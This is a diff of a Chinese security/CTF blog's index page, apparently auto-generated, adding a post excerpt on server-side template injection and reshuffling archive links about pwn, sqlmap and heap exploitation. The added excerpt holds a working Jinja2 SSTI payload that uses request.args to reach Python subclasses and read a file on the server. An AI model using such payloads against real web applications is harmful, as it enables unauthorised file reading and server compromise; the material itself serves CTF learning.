@@ -341,6 +341,42 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/28940/">
+            
+                <span>ssti</span>
+        </a>
+        <div class="abstract-content">
+            payload大全bypass 各种字符串
+利用request.args
+
+1&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read
+
+利用字符串拼接
+
+12&#123;&#123;requ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="python安全">python安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/45992/">
             
                 <span>php命令执行函数</span>
@@ -633,37 +669,6 @@ gcc -Wno-format-secur...
             <div class="abstract-tags">
     
         <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/29112/">
-            
-                <span>pwn前置知识</span>
-        </a>
-        <div class="abstract-content">
-            调用约定32位和64位程序的区别, 更多的是体现在调用约定(Calling Convention)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.
-本文主要是介绍Linux平台下的漏洞利用, 所以就专注于System V AMD64 ABI 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.
-12345678910111213141516171819202122$ cat victim.cint foo(int a, in...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
     
 </div>
             
@@ -1503,9 +1508,90 @@ gcc -Wno-format-secur...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 51
+        Total : 52
         </div>
         <!-- search  -->
         
@@ -1521,7 +1607,12 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">偏门汇编指令大全</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">汇编指令大全</a>
         </li>
     
     
@@ -1571,17 +1662,17 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1666,12 +1757,12 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
         </li>
     
     
@@ -1706,12 +1797,12 @@ gcc -Wno-format-secur...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1785,9 +1876,9 @@ gcc -Wno-format-secur...
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
-    
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
